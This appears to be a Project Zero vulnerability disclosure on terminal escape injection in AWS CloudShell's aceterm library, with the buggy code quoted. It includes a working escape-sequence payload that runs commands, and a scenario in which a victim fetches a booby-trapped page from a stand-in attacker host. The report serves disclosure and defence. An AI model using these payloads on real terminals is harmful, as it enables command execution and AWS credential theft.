EXP
---

    Terminal escape injection in AWS CloudShell

    The javascript terminal emulator used by AWS CloudShell handles certain terminal escape
    codes incorrectly. This can lead to remote code execution if attacker controlled data is
    displayed in a CloudShell instance.

    The bug is in the handling of DCS escape codes by the aceterm library:
    //https://github.com/c9/core/blob/master/plugins/c9.ide.terminal/aceterm/libterm.js#L1276
    // Request Termcap/Terminfo String (xterm, experimental)
    // Regular xterm does not even respond to this sequence.
    // This can cause a small glitch in vim.
    // test: echo -ne '\\eP+q6b64\\e\\\\'
    case '+q':
      var pt = this.currentParam
        , valid = false;

       this.send('\\x1bP' + +valid + '+r' + pt + '\\x1b\\\\');
       break;


    this.currentParam contains the arbitrary substring that follows the \"\\eP+q\" escape code.
    this.send() passes its argument to the terminal input handler. This can be used to
    execute arbitrary commands by putting a multiline string into this.currentParam.

    It's trivial to trigger the bug using echo, printing the string '\\eP+q\
    whoami\
    \\e\\\\',
    will trigger execution of the whoami command:

    [cloudshell-user@ip-10-0-163-85 ~]$ echo -ne '\\eP+q\
    whoami\
    \\e\\\\'
    [cloudshell-user@ip-10-0-163-85 ~]$
    [cloudshell-user@ip-10-0-163-85 ~]$ whoami
    cloudshell-user
    [cloudshell-user@ip-10-0-163-85 ~]$


    A potential attack scenario would be to trick someone into accessing a malicious web
    service using a tool like curl:

    attacker:
    - echo -e \"echo -ne \"abcdef\\x1bP+q\
    touch /tmp/foo\
    \\x1b\
    \"\" > index.html

    victim: (using AWS CloudShell)
    - curl http://evil.com/index.html

    This will create the file /tmp/foo on the victim machine.

    If AWS CloudShell is used to ssh into (potentially compromised) EC2 VMs or to view log
    files that contain attacker controlled payloads, similar attacks are possible.

    As CloudShell has full access to the credentials used for the management console login,
    exploiting this vulnerability can give an attacker a very powerful entry point to an AWS
    environment.

    This bug is subject to a 90 day disclosure deadline. After 90 days elapse, the bug report
    will become visible to the public. The scheduled disclosure date is 2021-05-09.
    Disclosure at an earlier date is also possible if agreed upon by all parties.

    Please credit Felix Wilhelm of Google Project Zero in all releases, patches and
    advisories related to this issue.




    Found by: fwilhelm@google.com